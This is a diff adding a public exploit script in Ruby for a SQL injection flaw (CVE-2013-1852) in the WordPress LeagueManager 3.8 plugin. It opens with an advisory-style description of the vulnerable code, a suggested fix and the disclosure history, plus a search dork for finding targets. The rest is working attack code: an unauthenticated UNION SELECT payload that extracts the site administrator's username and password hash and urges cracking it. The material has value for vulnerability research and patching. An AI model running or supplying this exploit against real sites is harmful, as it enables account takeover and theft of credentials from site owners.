@@ -1,0 +1,94 @@
+#!/usr/bin/ruby
+#
+# Exploit Title: WordPress LeagueManager Plugin v3.8 SQL Injection
+# Google Dork: inurl:"/wp-content/plugins/leaguemanager/"
+# Date: 13/03/13
+# Exploit Author: Joshua Reynolds
+# Vendor Homepage: http://wordpress.org/extend/plugins/leaguemanager/
+# Software Link: http://downloads.wordpress.org/plugin/leaguemanager.3.8.zip
+# Version: 3.8
+# Tested on: BT5R1 - Ubuntu 10.04.2 LTS
+# CVE: CVE-2013-1852
+#-----------------------------------------------------------------------------------------
+#Description:
+#
+#An SQL Injection vulnerability exists in the league_id parameter of a function call made
+#by the leaguemanager_export page. This request is processed within the leaguemanager.php:
+#
+#if ( isset($_POST['leaguemanager_export']))
+#               $lmLoader->adminPanel->export($_POST['league_id'], $_POST['mode']);
+#
+#Which does not sanitize of SQL injection, and is passed to the admin/admin.php page
+#into the export( $league_id, $mode ) function which also does not sanitize for SQL injection
+#when making this call: $this->league = $leaguemanager->getLeague($league_id);
+#The information is then echoed to a CSV file that is then provided.
+#
+#Since no authentication is required when making a POST request to this page, 
+#i.e /wp-admin/admin.php?page=leaguemanager-export the request can be made with no established
+#session.
+#
+#Fix:
+#
+#A possible fix for this would be to cast the league_id to an integer during any
+#of the function calls. The following changes can be made in the leaguemanager.php file:
+#$lmLoader->adminPanel->export((int)$_POST['league_id'], $_POST['mode']);
+#
+#These functions should also not be available to public requests, and thus session handling
+#should also be checked prior to the requests being processed within the admin section.
+#
+#The responsible disclosure processes were distorted by the fact that the author no longer
+#supports his well established plugin, and there are currently no maintainers. After
+#e-mailing the folks over at plugins@wordpress.org they've decided to discontinue the plugin
+#and not patch the vulnerability.
+#
+#The following ruby exploit will retrieve the administrator username and the salted 
+#password hash from a given site with the plugin installed:
+#------------------------------------------------------------------------------------------
+#Exploit:
+
+require 'net/http'
+require 'uri'
+
+if ARGV.length == 2
+	post_params = {
+		'league_id' => '7 UNION SELECT ALL user_login,2,3,4,5,6,7,8,'\
+		'9,10,11,12,13,user_pass,15,16,17,18,19,20,21,22,23,24 from wp_users--',
+		'mode' => 'teams',
+		'leaguemanager_export' => 'Download+File'
+	}
+
+	target_url = ARGV[0] + ARGV[1] + "/wp-admin/admin.php?page=leaguemanager-export"
+	
+	begin
+		resp = Net::HTTP.post_form(URI.parse(target_url), post_params)
+	rescue
+		puts "Invalid URL..."
+	end
+		
+	if resp.nil?
+		print_error "No response received..."
+
+	elsif resp.code != "200"
+		puts "Page doesn't exist!"
+	else	
+		admin_login = resp.body.scan(/21\t(.*)\t2.*0\t(.*)\t15/)
+	
+		if(admin_login.length > 0)
+			puts "Username: #{admin_login[0][0]}"
+			puts "Hash: #{admin_login[0][1]}"
+			puts "\nNow go crack that with Hashcat :)"
+		else
+			puts "Username and hash not received. Maybe it's patched?"
+		end
+	end
+else
+	puts "Usage: ruby LeagueManagerSQLI.rb \"http://example.com\" \"/wordpress\""
+end
+
+#Shout outs: Graycon Group Security Team, Red Hat Security Team, Miss Umer, Tim Williams, Dr. Wu, friends & family.
+#
+#Contact:
+#Mail: infosec4breakfast@gmail.com
+#Blog: infosec4breakfast.com
+#Twitter: @jershmagersh
+#Youtube: youtube.com/user/infosec4breakfast
